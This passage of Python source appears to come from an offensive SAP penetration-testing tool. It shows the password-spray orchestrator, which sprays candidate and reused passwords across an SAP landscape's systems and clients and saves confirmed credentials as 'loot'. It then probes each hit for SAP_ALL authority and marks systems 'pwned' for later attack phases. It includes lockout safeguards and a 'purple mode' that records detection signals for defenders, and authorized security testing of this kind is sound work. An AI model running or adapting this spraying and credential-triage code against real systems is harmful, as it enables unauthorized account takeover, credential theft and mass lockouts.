            if result in HIT_CODES:
                row["kind"] = "hit"
                hit_users_per_client.setdefault(client, set()).add(uname_up)
            elif result == USER_LOCKED:
                row["kind"] = "locked"
                locked_users.add(uname_up)
                _emit(row)
                # Don't sleep after a lock — exit the inner loop fast
                continue
            elif result == NO_DIALOG_USER:
                row["kind"] = "miss"
                row["skipped_reason"] = "no_dialog_user"
                nodialog_users.add(uname_up)
            else:
                row["kind"] = "miss"
            _emit(row)
            # Check cancel BEFORE the inter-attempt sleep so STOP
            # pressed during the current attempt skips the sleep
            # entirely instead of waiting out ~0.3-0.9s floor.
            if cancel_check and cancel_check():
                break
            _jittered_sleep(inter_attempt_sleep_range,
                            cancel_check=cancel_check)
    return results


# ---------------------------------------------------------------------------
# Orchestration
# ---------------------------------------------------------------------------

def _make_run_id(base_ts: Optional[str] = None) -> str:
    """Deterministic-ish run id — timestamp + short sha of the pid.
    Used as the loot subdir name."""
    ts = base_ts or datetime.utcnow().strftime("%Y%m%dT%H%M%SZ")
    tail = _sha256_prefix(f"{ts}:{os.getpid()}", 6)
    return f"spray_{ts}_{tail}"


def _append_attempt_jsonl(path: str, attempt: SprayAttempt) -> None:
    try:
        with open(path, "a", encoding="utf-8") as fh:
            fh.write(json.dumps(asdict(attempt), default=str))
            fh.write("\n")
    except Exception as e:
        logger.debug("attempts.jsonl write failed (%s): %s", path, e)


def _upgrade_or_append_credential(node, cred_kwargs: dict) -> None:
    """Add a confirmed-hit (user, client, password) to ``node.credentials``
    with ``kind='spray'``, dedup-upgrading an existing unverified
    entry to ``verified=True`` instead of appending a duplicate.
    Fixes an existing gap in ``node_check_default_creds`` where a
    second hit on the same (user, client, password) left two entries
    on the node and the earlier ``verified=False`` was never flipped.
    """
    # Local import — only this helper needs it, no reason to burden
    # module load with the full models graph.
    from sapmap_models import Credentials
    user = (cred_kwargs.get("username") or "").upper()
    client = (cred_kwargs.get("client") or "").strip()
    password = cred_kwargs.get("password") or ""
    for existing in (node.credentials or []):
        if (getattr(existing, "username", "") or "").upper() != user:
            continue
        if (getattr(existing, "client", "") or "").strip() != client:
            continue
        if (getattr(existing, "password", "") or "") != password:
            continue
        # Found a match — upgrade in place.
        if cred_kwargs.get("verified", False):
            existing.verified = True
        if cred_kwargs.get("kind") and not getattr(existing, "kind", ""):
            existing.kind = cred_kwargs["kind"]
        return
    node.credentials.append(Credentials(**cred_kwargs))


def _record_lockout_landscape_wide(state, sid: str, client: str,
                                    user: str) -> None:
    """Add ``user`` to the landscape-wide locked-user cache so every
    subsequent target in this engagement refuses it."""
    key = user.upper()
    now = datetime.utcnow().isoformat()
    entry = (state.pwspray_locked_users or {}).get(key)
    if not entry:
        entry = {"username": user, "locked_on": [], "unlock_eta": None}
        state.pwspray_locked_users[key] = entry
    entry["locked_on"].append([sid, client, now])


def spray_landscape(
    state,
    config: Optional[SprayConfig] = None,
    *,
    scope_filter: Optional[dict] = None,
    cancel_check: Optional[Callable[[], bool]] = None,
    try_login_fn: Optional[Callable] = None,
    telemetry_probe_fn: Optional[Callable[[object], dict]] = None,
    loot_dir_fn: Optional[Callable[[str], str]] = None,
    on_attempt: Optional[Callable[[SprayAttempt], None]] = None,
    usr02_probe_fn: Optional[Callable] = None,
    purple_report_fn: Optional[Callable] = None,
    hit_authority_probe_fn: Optional[Callable] = None,
) -> SprayRun:
    """Orchestrator — sequential outer target loop, inner spray engine
    per (target × clients × candidates).  Consults the landscape-wide
    lockout cache before every target.  Writes a per-run SprayRun
    summary to ``state.spray_runs`` and (on real runs) a
    ``loot/spray/<run_id>/attempts.jsonl`` audit file.

    ``try_login_fn`` / ``telemetry_probe_fn`` / ``loot_dir_fn`` are
    injectable so tests can run the whole flow without real sockets
    or filesystem writes.
    """
    config = config or SprayConfig()
    if not config.run_id:
        config.run_id = _make_run_id()

    run = SprayRun(
        run_id=config.run_id,
        started_at=datetime.utcnow().isoformat(),
        config_snapshot={
            "cap_per_user": config.cap_per_user,
            "dry_run": config.dry_run,
            "purple_mode": config.purple_mode,
            "include_scc": config.include_scc,
            "include_wd_admin": config.include_wd_admin,
            "include_db_connect": config.include_db_connect,
            "terminal": config.effective_terminal(),
            "scope_filter": scope_filter or {},
        },
    )

    # Seed the status singleton (issue #69, PR3) so the GUI's progress
    # panel can show the run as it unfolds.  SINGLE-WRITER invariant:
    # this thread (the one _bg spawned) owns _status for the duration.
    scope_label = "landscape"
    if scope_filter and scope_filter.get("single_sid"):
        scope_label = f"single:{scope_filter['single_sid']}"
    elif scope_filter and scope_filter.get("sids"):
        # Multi-SID run (issue #107).  Preserve operator-specified
        # order in the label — the engine already preserves it in the
        # target iteration via the list-not-set fix above.
        _sids_render = list(scope_filter["sids"])
        scope_label = "multi:" + ",".join(_sids_render)
    _reset_status(
        run_id=config.run_id,
        scope=scope_label,
        dry_run=bool(config.dry_run),
        cap_per_user=int(config.cap_per_user),
        started_at=run.started_at,
    )
    _set_phase("collect_pool")

    # Dry-run safety: refuse at the SERVICE boundary when the operator
    # didn't tick accept_lockout_risk.  Preview is still useful — pool
    # + target matrix are returned via the GUI's preview route, not
    # this orchestrator.
    if not config.dry_run and not config.accept_lockout_risk:
        run.aborted = "dry_run_default_active"
        run.finished_at = datetime.utcnow().isoformat()
        state.spray_runs.append(run.to_dict())
        _finalise_status(run)
        return run

    pool = landscape_password_pool(
        state,
        include_db_connect=config.include_db_connect,
        include_wd_admin=config.include_wd_admin,
        include_scc=config.include_scc,
        manual_wordlist=config.manual_wordlist,
    )
    _append_log(f"pool: {len(pool)} candidate(s)")
    _set_phase("profile_probe")
    tm = build_target_matrix(state, scope_filter=scope_filter)
    targets: List[SprayTarget] = tm["eligible"]
    for node, reason in tm["ineligible"]:
        run.skipped.append({"sid": node.sid, "reason": reason})
    _status.targets_total = len(targets)
    _append_log(f"targets: {len(targets)} eligible, "
                f"{len(tm['ineligible'])} skipped")

    # Early totals estimate (upper bound) so progress UI has a
    # denominator.  Doesn't account for short-circuit / skip-list —
    # actual attempts_done will be lower.
    run.attempts_total = sum(
        len(t.clients) * len(pool) for t in targets)
    _status.attempts_total = run.attempts_total
    if targets:
        _set_phase("spray")
        _set_phase_progress(0, len(targets))

    # Loot dir — real runs land under loot/spray/<run_id>/; dry runs
    # skip filesystem touches entirely.
    attempts_jsonl_path = ""
    if not config.dry_run:
        base = (loot_dir_fn or _default_loot_dir)(config.run_id)
        if base:
            attempts_jsonl_path = os.path.join(base, "attempts.jsonl")
            run.loot_path = base

    total_locks_observed = 0
    skip_users = _effective_skip_users(config.opt_in_users)
    pre_locked = {u.upper() for u in (state.pwspray_locked_users or {}).keys()}

    # Purple-mode USR02 baseline (issue #69, PR4).
    # Key: f"{sid}|{client}|{user_upper}" -> {"locnt": int, "uflag": str,
    #                                            "ustyp": str, "ts": iso}
    # Populated BEFORE the per-target loop (one RFC_READ_TABLE per
    # (sid, client) batched over unique users) so the spray attempts
    # ride on an already-dialled connection.  Only reads USR02; does
    # NOT touch anything that would increment LOCNT.
    purple_baseline: dict = {}
    purple_readback: dict = {}
    purple_mode = bool(config.purple_mode) and not config.dry_run
    unique_pool_users: Set[str] = set()
    # Accumulate per-target failures so an operator-visible summary
    # shows every failure reason — overwriting the single string per
    # target silently drops multi-failure history (PR4 adversarial
    # review MED #4).
    baseline_errors: List[str] = []
    if purple_mode:
        _set_phase("baseline")
        # Collect unique users (post-filter) so we don't read USR02
        # for SAP*/DDIC/etc. — defeats the clean-SIEM-signal purpose.
        for cand in pool:
            uu = (cand.username or "").upper()
            if not uu or uu in skip_users or uu in pre_locked:
                continue
            unique_pool_users.add(uu)
        _set_phase_progress(0, max(1, len(targets)))
        if usr02_probe_fn is None:
            # No injected probe → default to the sapmap_rfc helper.
            usr02_probe_fn = _default_usr02_probe
        baseline_hits = 0
        for bi, target in enumerate(targets):
            # Honour STOP during the baseline phase so a long RFC
            # round-trip loop can be aborted — pre-fix the operator
            # pressing STOP during baseline just waited for every
            # (sid, client) USR02 read to complete first.
            if cancel_check and cancel_check():
                run.aborted = run.aborted or "user_stop"
                break
            node = (state.nodes or {}).get(target.sid)
            if node is None:
                continue
            creds = node.best_credentials()
            if creds is None:
                baseline_errors.append(
                    f"{target.sid}: no verified credentials")
                continue
            for client in target.clients:
                if cancel_check and cancel_check():
                    run.aborted = run.aborted or "user_stop"
                    break
                # Bounded-timeout wrapper: an unresponsive RFC
                # handshake used to block the baseline phase
                # indefinitely with no way out short of killing
                # the SAPMAP process.
                try:
                    rows = _run_with_watchdog(
                        usr02_probe_fn,
                        node, creds, client, sorted(unique_pool_users),
                        timeout_s=config.usr02_probe_timeout_s,
                        default=None)
                except Exception as e:
                    baseline_errors.append(
                        f"{target.sid}/{client}: {e}")
                    continue
                if rows is None:
                    baseline_errors.append(
                        f"{target.sid}/{client}: USR02 probe exceeded "
                        f"usr02_probe_timeout_s="
                        f"{config.usr02_probe_timeout_s}s")
                    continue
                for u, info in (rows or {}).items():
                    key = f"{target.sid}|{client}|{u.upper()}"
                    purple_baseline[key] = {
                        "locnt": int(info.get("locnt", 0) or 0),
                        "uflag": str(info.get("uflag", "")),
                        "ustyp": str(info.get("ustyp", "")),
                        "ts": datetime.utcnow().isoformat(),
                    }
                    baseline_hits += 1
            if run.aborted:
                break
            _set_phase_progress(bi + 1, max(1, len(targets)))
        run.purple_baseline_available = baseline_hits > 0
        run.purple_baseline_error = "; ".join(baseline_errors)
        _append_log(
            f"purple baseline: {baseline_hits} USR02 row(s) read "
            f"across {len(targets)} target(s)"
            + (f" (errors: {len(baseline_errors)})"
               if baseline_errors else ""))
        # Progress through to spray phase; status indicator keeps
        # 'baseline' marked .done because PHASE_ORDER ordering kicks in.
        if targets:
            _set_phase("spray")
            _set_phase_progress(0, len(targets))

    for ti, target in enumerate(targets):
        if cancel_check and cancel_check():
            run.aborted = run.aborted or "user_stop"
            break
        node = (state.nodes or {}).get(target.sid)
        if node is None:
            continue
        # Cross-target circuit breaker check BEFORE firing anything
        if total_locks_observed >= config.max_total_locks_per_run:
            run.aborted = "cascade_abort"
            # Flip _propagate_locked_out on every remaining target so
            # AutoPwn/TMS/manual LPE respect the cascade.
            for later in targets[ti:]:
                lnode = (state.nodes or {}).get(later.sid)
                if lnode is not None:
                    lnode._propagate_locked_out = True
            break
        # Per-node attempt budget (dry-run just reports the planned cap)
        budget = compute_attempt_budget(
            node, config.cap_per_user,
            probe_fn=(None if config.dry_run else telemetry_probe_fn))
        cap_for_this_target = budget["cap_per_user"]
        # MERGE (not replace) so any audit-profile keys an upstream
        # probe already stashed (e.g. rsau_enable, rsau_ip_only from
        # a future rsau probe path) survive.  PR4 ships without the
        # rsau fields on signal rows — adding them is a follow-up
        # since no code populates those keys today.
        _lp = dict(node.lockout_profile or {})
        _lp.update({
            "fails_to_user_lock": budget.get("fails_to_user_lock"),
            "cap_computed": cap_for_this_target,
            "cap_source": budget.get("cap_source", ""),
            "probed_at": datetime.utcnow().isoformat(),
            "warnings": list(budget.get("warnings", [])),
        })
        node.lockout_profile = _lp

        if config.dry_run:
            # Preview mode — don't open sockets; just record what we
            # WOULD have attempted so the UI's preview knows.
            continue

        def _pre_attempt(cand, client, idx, total):
            """Fired BEFORE each try_login socket call.  Updates the
            status singleton's current_* fields so the GUI panel can
            render 'Now trying: <SID>/<CLIENT> user=<USER> (i/N)' —
            and appends a per-attempt log line to the status's
            log_tail so operators watching the console see progress
            even on slow attempts."""
            _status.current_target_sid = target.sid
            _status.current_target_host = target.host
            _status.current_client = client
            _status.current_user = cand.username
            _status.current_candidate_index = idx + 1
            _status.current_candidate_total = total
            _append_log(
                f"[*] {target.sid}/{client} user={cand.username} "
                f"({idx + 1}/{total}) src={cand.source_kind}")

        def _on_result(row: dict) -> None:
            nonlocal total_locks_observed
            # Persist attempt to disk + optional callback for progress UI
            attempt = SprayAttempt(
                ts=datetime.utcnow().isoformat(),
                sid=target.sid, host=target.host,
                dispatcher_port=target.dispatcher_port,
                client=row.get("client", ""),
                user=row.get("user", ""),
                pw_sha256_prefix=row.get("pw_sha256_prefix", ""),
                source_kind=row.get("source_kind", ""),
                source_sid=row.get("source_sid", ""),
                result=row.get("result", ""),
                detail=row.get("detail", ""),
                terminal=config.effective_terminal(),
                skipped_reason=row.get("skipped_reason", ""),
            )
            if attempts_jsonl_path:
                _append_attempt_jsonl(attempts_jsonl_path, attempt)
            if on_attempt is not None:
                try:
                    on_attempt(attempt)
                except Exception:
                    logger.debug("on_attempt callback raised",
                                 exc_info=True)
            # Purple-mode signal row (issue #69, PR4).  Written at
            # attempt time with everything we know; readback phase
            # fills in observed USR02 delta.  NO cleartext — the
            # join key to attempts.jsonl is (ts, pw_sha256_prefix).
            if purple_mode and attempt.result not in ("SKIPPED",):
                uu = (attempt.user or "").upper()
                base_key = (
                    f"{target.sid}|{attempt.client}|{uu}")
                baseline_row = purple_baseline.get(base_key)
                sig_catalog = SAL_LOGON_SIGNALS.get(
                    attempt.result, {})
                signal_row = {
                    "run_id": config.run_id,
                    "ts": attempt.ts,
                    "sid": target.sid,
                    "host": target.host,
                    "client": attempt.client,
                    "user": attempt.user,
                    "pw_sha256_prefix": attempt.pw_sha256_prefix,
                    "source_kind": attempt.source_kind,
                    "source_sid": attempt.source_sid,
                    "result": attempt.result,
                    "terminal": attempt.terminal,
                    "sal_class": "00",
                    "sal_numbers": list(
                        sig_catalog.get("sal_numbers", [])),
                    "sal_label": sig_catalog.get("label", ""),
                    "sm21_hint": sig_catalog.get(
                        "sm21_hint", "").replace(
                            "<USER>", attempt.user or ""),
                    "baseline_locnt": (
                        baseline_row.get("locnt")
                        if baseline_row else None),
                    "baseline_ustyp": (
                        baseline_row.get("ustyp")
                        if baseline_row else ""),
                    "readback_locnt": None,
                    "delta_locnt": None,
                    # sal_will_fire / terminal_will_land require
                    # rsau/enable + rsau/ip_only from the kernel
                    # audit profile.  No code populates those keys
                    # today — PR4 adversarial review HIGH #2 / #11
                    # removed the misleading False defaults; a
                    # future PR extends the telemetry probe to
                    # populate them + the Defender View re-adds
                    # the grey-out when accurate.
                }
                _append_purple_signal(node, signal_row)
            run.attempts_done += 1
            _status.attempts_done = run.attempts_done
            # Per-attempt result signal (slow/silent/no-stop
            # follow-up).  Rendered by the GUI panel as 'Last
            # result: <RESULT>' alongside the 'Now trying' row.
            _status.last_result = row.get("result", "") or ""
            _status.last_detail = (row.get("detail") or "")[:80]
            # For MISS/LOCKED/ERROR, also emit an indented follow-up
            # line next to the '[*] SID/CLIENT user=...' line from
            # on_pre_attempt — so the log tail reads as pairs:
            #   [*] NPL/001 user=DDIC (3/7) src=secstore
            #       → MISS
            # HIT lines are already emitted explicitly below.  Skip
            # 'skipped' kinds since they never fired a socket.
            _kind = row.get("kind")
            if _kind in ("miss", "locked", "error"):
                _res = row.get("result") or _kind.upper()
                _append_log(f"    → {_res}")
            kind = row.get("kind")
            # Idempotency record (issue #69, PR5) — remember every
            # fired triple so a next-wave AutoPwn phase3b doesn't
            # retry.  Record on every outcome that actually dialed
            # (hit / miss / locked / plain wrong-password), but
            # NOT 'skipped' (those were skip-list / cap / lock
            # cache decisions that never opened a socket) so a
            # reset_history + retry can still reach the skipped
            # candidates.
            # Key uses the FULL sha256 (not the 8-char prefix) —
            # a leaked .sapmap would otherwise expose 32 bits of
            # entropy per weak password, trivially brute-forceable
            # offline (PR5 adversarial review LOW #11).
            if kind != "skipped":
                _full_sha = hashlib.sha256(
                    (row.get("password") or "").encode("utf-8")
                ).hexdigest()
                _triple_key = (
                    f"{attempt.client}|{(attempt.user or '').upper()}|"
                    f"{_full_sha}")
                if node._pwspray_tested_triples is None:
                    node._pwspray_tested_triples = set()
                node._pwspray_tested_triples.add(_triple_key)
            if kind == "hit":
                hit = {"sid": target.sid, "client": row.get("client"),
                       "user": row.get("user"),
                       "source_kind": row.get("source_kind"),
                       "source_sid": row.get("source_sid"),
                       "result": row.get("result")}
                run.hits.append(hit)
                _status.hits = len(run.hits)
                _append_log(
                    f"HIT {target.sid}/{row.get('client')} user="
                    f"{row.get('user')} src={row.get('source_kind')}")
                _upgrade_or_append_credential(node, dict(
                    username=row["user"], password=row["password"],
                    client=row["client"], instance_nr="",
                    verified=True, kind="spray"))
                # Post-hit authority probe (issue #69, PR5-de-gate /
                # Option B).  Classifies the credential's authority
                # into one of three tiers; sap_all upgrades
                # node.pwned=True, the others leave pwned alone so
                # phase4_propagate doesn't waste SU01 BAPIs on a
                # dialog-only user.  Probe is injectable so tests
                # can run without pyrfc.
                _probe = (hit_authority_probe_fn
                          or _default_hit_authority_probe)
                # Bounded-timeout wrapper: the default probe opens an
                # RFC connection as the sprayed user and calls
                # BAPI_USER_GET_DETAIL — on an unreachable co-tenant
                # or slow RFC handshake, this would block the whole
                # spray loop (operator-reported 3-min stall after the
                # first HIT fired against a cross-landscape target).
                try:
                    _auth = _run_with_watchdog(
                        _probe,
                        node, row.get("client"),
                        row.get("user"), row.get("password"),
                        timeout_s=config.hit_probe_timeout_s,
                        default={
                            "authority_level": "probe_failed",
                            "profiles": [], "roles": [],
                            "note": (
                                f"probe exceeded "
                                f"hit_probe_timeout_s="
                                f"{config.hit_probe_timeout_s}s"),
                        })
                except Exception as _e:
                    _auth = {
                        "authority_level": "probe_failed",
                        "profiles": [], "roles": [],
                        "note": f"probe raised: {_e}",
                    }
                _tier = _auth.get("authority_level", "probe_failed")
                _hit_user_entry = {
                    "run_id": config.run_id,
                    "ts": datetime.utcnow().isoformat(),
                    "client": row.get("client", ""),
                    "user": row.get("user", ""),
                    "source_kind": row.get("source_kind", ""),
                    "source_sid": row.get("source_sid", ""),
                    "pw_sha256_prefix": row.get("pw_sha256_prefix", ""),
                    "authority_level": _tier,
                    "profiles": list(_auth.get("profiles", []) or []),
                    "roles": list(_auth.get("roles", []) or []),
                    "note": _auth.get("note", ""),
                }
                if node.spray_hit_users is None:
                    node.spray_hit_users = []
                node.spray_hit_users.append(_hit_user_entry)
                # Per-hit finding tiered by authority so the ATT&CK
                # heatmap + engagement report reflect actual blast
                # radius.  sap_all → CRITICAL + node.pwned=True;
                # privileged → HIGH; unprivileged → MEDIUM; probe
                # failed → MEDIUM with note.  Lazy-import to avoid
                # a sapmap_findings → sapmap_pwspray cycle.
                try:
                    from sapmap_findings import emit_finding
                except Exception:
                    emit_finding = None   # noqa: N806
                _hit_msg_prefix = (
                    f"Spray hit {row.get('user')}@{target.sid}/"
                    f"{row.get('client')}")
                if _tier == "sap_all":
                    node.pwned = True
                    _append_log(
                        f"HIT auth: SAP_ALL on {target.sid}/"
                        f"{row.get('client')} user={row.get('user')} "
                        f"→ node.pwned=True")
                    try:
                        if emit_finding is None:
                            raise RuntimeError("emit_finding unavailable")
                        emit_finding(
                            "CRITICAL", target.sid,
                            (f"{_hit_msg_prefix} — "
                             f"**SAP_ALL** ({_auth.get('note', '')})"),
                            ref="pwspray.hit.sap_all",
                            attack_capability="creds.password_spray")
                    except Exception:
                        pass
                elif _tier == "privileged":
                    _append_log(
                        f"HIT auth: privileged on {target.sid}/"
                        f"{row.get('client')} user={row.get('user')} "
                        f"(profiles={len(_hit_user_entry['profiles'])}, "
                        f"roles={len(_hit_user_entry['roles'])})")
                    try:
                        if emit_finding is None:
                            raise RuntimeError("emit_finding unavailable")
                        emit_finding(
                            "HIGH", target.sid,
                            (f"{_hit_msg_prefix} — privileged "
                             f"({len(_hit_user_entry['profiles'])} "
                             f"profile(s), "
                             f"{len(_hit_user_entry['roles'])} "
                             f"role(s); SAP_ALL NOT observed)"),
                            ref="pwspray.hit.privileged",
                            attack_capability=(
                                "creds.password_reuse_cross_system"
                                if row.get("source_sid")
                                else "creds.password_spray"))
                    except Exception:
                        pass
                elif _tier == "unprivileged":
                    _append_log(
                        f"HIT auth: unprivileged on {target.sid}/"
                        f"{row.get('client')} user={row.get('user')} "
                        f"(no profiles, no roles)")
                    try:
                        if emit_finding is None:
                            raise RuntimeError("emit_finding unavailable")
                        emit_finding(
                            "MEDIUM", target.sid,
                            (f"{_hit_msg_prefix} — logon works "
                             f"but user carries no profiles / roles "
                             f"(dialog or service account)"),
                            ref="pwspray.hit.unprivileged",
                            attack_capability="creds.password_spray")
                    except Exception:
                        pass
                else:   # probe_failed
                    _append_log(
                        f"HIT auth: probe_failed on {target.sid}/"
                        f"{row.get('client')} user={row.get('user')} "
                        f"— {_auth.get('note', '')}")
                    try:
                        if emit_finding is None:
                            raise RuntimeError("emit_finding unavailable")
                        emit_finding(
                            "MEDIUM", target.sid,
                            (f"{_hit_msg_prefix} — authority probe "
                             f"failed ({_auth.get('note', '')})"),
                            ref="pwspray.hit.probe_failed",
                            attack_capability="creds.password_spray")
                    except Exception:
                        pass
                # Persist counter so a crash-restart doesn't re-burn
                # budget on this (sid, client, user) triple.
                counter_key = (
                    f"{target.sid}|{row['client']}|{row['user'].upper()}")
                prior = state.spray_attempts_counter.get(counter_key, {})
                state.spray_attempts_counter[counter_key] = {
                    "count": prior.get("count", 0) + 1,
                    "last_result": row.get("result"),
                    "last_at": datetime.utcnow().isoformat(),
                    "locked_observed": prior.get("locked_observed", False),
                    "cap_computed": cap_for_this_target,
                    "cap_source": budget.get("cap_source", ""),
                    "baseline_counter_at_probe": prior.get(
                        "baseline_counter_at_probe", -1),
                }
            elif kind == "locked":
                total_locks_observed += 1
                node._propagate_locked_out = True
                _record_lockout_landscape_wide(
                    state, target.sid, row.get("client", ""),
                    row.get("user", ""))
                if row.get("user") not in run.locked_users:
                    run.locked_users.append(row["user"])
                _status.locks = len(run.locked_users)
                _append_log(
                    f"LOCK {target.sid}/{row.get('client')} user="
                    f"{row.get('user')}")
            elif kind == "skipped":
                run.skipped.append({"sid": target.sid,
                                    "user": row.get("user"),
                                    "client": row.get("client"),
                                    "reason": row.get("skipped_reason")})

        check_sprayed_credentials(
            target.host, target.dispatcher_port, target.clients, pool,
            cap_per_user=cap_for_this_target,
            saprouter=target.saprouter,
            terminal=config.effective_terminal(),
            pre_known_locked_users=pre_locked,
            skip_users=skip_users,
            cancel_check=cancel_check,
            early_exit_on_hit=config.early_exit_on_hit,
            on_result=_on_result,
            try_login_fn=try_login_fn,
            # Shorter per-attempt timeout (default 3s) keeps median
            # attempt wall-clock low and bounds the stop-latency on
            # unreachable hosts.  Operator-reported 1/224 in 3min
            # was partly from 17s-per-attempt worst case here.
            attempt_timeout_s=config.attempt_timeout_s,
            # Per-attempt visibility — fires BEFORE the DIAG socket
            # call so the status panel + log tail show what the
            # engine is currently trying.
            on_pre_attempt=_pre_attempt,
            # Idempotency READ (issue #69, PR5): triples that were
            # fired on this node in a prior wave are skipped so a
            # multi-wave AutoPwn doesn't eat the per-user cap again.
            # Pass the SAME set reference the _on_result writer
            # mutates — the engine reads BEFORE firing, so an entry
            # added later in this loop doesn't block the current
            # attempt (candidates for one user are tried in order,
            # cap_per_user still limits the per-call budget).
            tested_triples=(node._pwspray_tested_triples
                            if node._pwspray_tested_triples
                            else None),
        )
        # Node summary tooltip
        node.spray_last_run = {
            "run_id": config.run_id,
            "ts": datetime.utcnow().isoformat(),
            "attempts": sum(1 for h in run.hits if h["sid"] == target.sid),
            "hits": sum(1 for h in run.hits if h["sid"] == target.sid),
            "locked_users": list(run.locked_users),
        }
        # Refresh pre_locked between targets so a lock we just observed
        # bans the user on every remaining target.
        pre_locked = {u.upper() for u in (
            state.pwspray_locked_users or {}).keys()}
        _bump_targets_done()
        _set_phase_progress(_status.targets_done, len(targets))
        # Inter-node pause.  Sliced so STOP pressed during the pause
        # is honoured within ~100ms instead of waiting out the full
        # 1-2s jitter range.
        if ti < len(targets) - 1:
            _jittered_sleep(DEFAULT_INTER_NODE_SLEEP,
                            cancel_check=cancel_check)

    # Purple-mode USR02 readback (issue #69, PR4).  Re-read LOCNT
    # per (sid, client, user) that had a baseline, compute delta,
    # and backfill the signal rows that _on_result already appended
    # to node.spray_purple_signals.
    if purple_mode and run.purple_baseline_available:
        _set_phase("readback")
        _set_phase_progress(0, max(1, len(targets)))
        for ri, target in enumerate(targets):
            if cancel_check and cancel_check():
                run.aborted = run.aborted or "user_stop"
                break
            node = (state.nodes or {}).get(target.sid)
            if node is None:
                continue
            creds = node.best_credentials()
            if creds is None:
                continue
            for client in target.clients:
                if cancel_check and cancel_check():
                    run.aborted = run.aborted or "user_stop"
                    break
                # Same bounded-timeout wrapper as the baseline phase
                # — purple readback can hang on the same slow RFC
                # handshake and had the same no-way-out-but-kill
                # issue pre-fix.
                try:
                    rows = _run_with_watchdog(
                        usr02_probe_fn,
                        node, creds, client,
                        sorted(unique_pool_users),
                        timeout_s=config.usr02_probe_timeout_s,
                        default=None)
                except Exception as e:
                    logger.debug(
                        "usr02 readback failed on %s/%s: %s",
                        target.sid, client, e)
                    continue
                if rows is None:
                    continue
                for u, info in (rows or {}).items():
                    rb_key = f"{target.sid}|{client}|{u.upper()}"
                    purple_readback[rb_key] = {
                        "locnt": int(info.get("locnt", 0) or 0),
                        "uflag": str(info.get("uflag", "")),
                        "ts": datetime.utcnow().isoformat(),
                    }
            if run.aborted:
                break
            _set_phase_progress(ri + 1, max(1, len(targets)))
        # Backfill the signal rows accumulated during spray.
        for n in (state.nodes or {}).values():
            for sig in (n.spray_purple_signals or []):
                if sig.get("run_id") != config.run_id:
                    continue
                rb_key = (f"{sig.get('sid','')}|{sig.get('client','')}|"
                          f"{(sig.get('user','') or '').upper()}")
                rb = purple_readback.get(rb_key)
                if rb is not None:
                    sig["readback_locnt"] = rb.get("locnt")
                    base = sig.get("baseline_locnt")
                    if base is not None:
                        sig["delta_locnt"] = (
                            int(rb.get("locnt", 0) or 0) - int(base or 0))

    _set_phase("report")
    # Purple-mode report writer — materialise loot/spray/<run_id>/
    # purple_report.{md,html} from the collected signal rows.
    # NEVER writes cleartext — only pw_sha256_prefix.
    if (purple_mode and run.loot_path
            and not config.dry_run):
        try:
            writer = purple_report_fn or write_purple_report
            writer(run, state, run.loot_path)
            run.purple_report_generated = True
            _append_log(
                f"purple_report written to {run.loot_path}")
        except Exception as e:
            logger.error("purple report write failed", exc_info=True)
            _append_log(f"purple_report FAILED: {e}")

    run.finished_at = datetime.utcnow().isoformat()
    state.spray_runs.append(run.to_dict())
    _finalise_status(run)
    return run


def spray_single_node(
    node,
    state,
    config: Optional[SprayConfig] = None,
    *,
    cancel_check: Optional[Callable[[], bool]] = None,
    try_login_fn: Optional[Callable] = None,
    telemetry_probe_fn: Optional[Callable[[object], dict]] = None,
    loot_dir_fn: Optional[Callable[[str], str]] = None,
    on_attempt: Optional[Callable[[SprayAttempt], None]] = None,
) -> SprayRun:
    """Thin wrapper over :func:`spray_landscape` scoped to one node.
    Backs the per-node ctx-menu action."""
    return spray_landscape(
        state, config,
        scope_filter={"single_sid": node.sid},
        cancel_check=cancel_check,
        try_login_fn=try_login_fn,
        telemetry_probe_fn=telemetry_probe_fn,
        loot_dir_fn=loot_dir_fn,
        on_attempt=on_attempt,
    )


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

# SAP BNAME charset — alphanumerics plus ``_./@#$-`` (12-char max).
# Everything outside this set is rejected before interpolation so a
# wordlist line like ``A','DDIC`` can't inject into the WHERE clause
# (OpenSQL injection → USR02 leak + baseline-integrity poisoning).
_BNAME_RE = re.compile(r"^[A-Z0-9_./@#$-]{1,12}$")
# SAP MANDT (client) — always 3 digits.
_MANDT_RE = re.compile(r"^[0-9]{3}$")

# Batch size for USR02 reads.  Each quoted 12-char BNAME = 14 chars,
# plus a comma per item.  3 users = 14*3 + 2 commas = 44 chars for
# the IN-list, plus 'MANDT = \'000\' AND BNAME IN ()' = 29 chars →
# 73 chars worst case.  read_table split-on-whitespace handles 73
# cleanly (last token is the ')').  5-per-batch overflowed with
# margin to spare (12-char max BNAMEs produced ~85 chars) — PR4
# adversarial review HIGH #3.
_USR02_BATCH_SIZE = 3


def _append_purple_signal(node, row, *, max_run_ids: int = 3):
    """Append a signal row to ``node.spray_purple_signals`` and
    bound the per-node list by the N most-recent distinct run_ids
    (default 3) — otherwise the list grows unbounded across runs
    and bloats the .sapmap state file (PR4 adversarial review
    LOW #7).

    Evicts in-place from the oldest run_id side so the current
    run's rows are always preserved.
    """
    if node.spray_purple_signals is None:
        node.spray_purple_signals = []
    node.spray_purple_signals.append(row)
    # Fast path: if we're still inside one run, no eviction needed.
    seen_ids = []
    for sig in node.spray_purple_signals:
        rid = sig.get("run_id", "")
        if rid and rid not in seen_ids:
            seen_ids.append(rid)
    if len(seen_ids) <= max_run_ids:
        return
    # Drop rows for the oldest run_ids (keep the latest max_run_ids).
    keep = set(seen_ids[-max_run_ids:])
    node.spray_purple_signals[:] = [
        s for s in node.spray_purple_signals
        if s.get("run_id") in keep]


def _md_escape_cell(value) -> str:
    """Return a Markdown-table-safe cell value.  Strips the four
    characters that break a GFM table row: ``|``, ``\\n``, ``\\r``,
    and ``\\`` (which otherwise escapes the next pipe).  Also
    removes backticks so an inline-code-span cell can't be closed
    mid-cell by operator input.  Keeps everything else verbatim.

    PR4 adversarial review MED #9 — the Markdown rows previously
    inlined raw strings, so a username containing ``|`` or
    `` ` `` would break the table or re-open the code span.
    """
    s = "" if value is None else str(value)
    for bad in ("|", "\n", "\r", "\\", "`"):
        s = s.replace(bad, "")
    return s


# SAP_ALL profile aliases.  Match the set that
# sapmap_exploit._user_has_sap_all treats as a hit.
_SAP_ALL_ALIASES = {"SAP_ALL", "ALL_AUTHORIZATIONS_PROF", "S_A.SYSTEM"}


def _default_hit_authority_probe(node, client, user, password):
    """Default post-hit authority probe (issue #69, PR5-de-gate).

    Opens an RFC connection AS the sprayed user (not as the operator)
    and classifies the authority the credential grants into one of
    three tiers:

      - ``sap_all``       — PROFILES or ACTIVITYGROUPS carries SAP_ALL
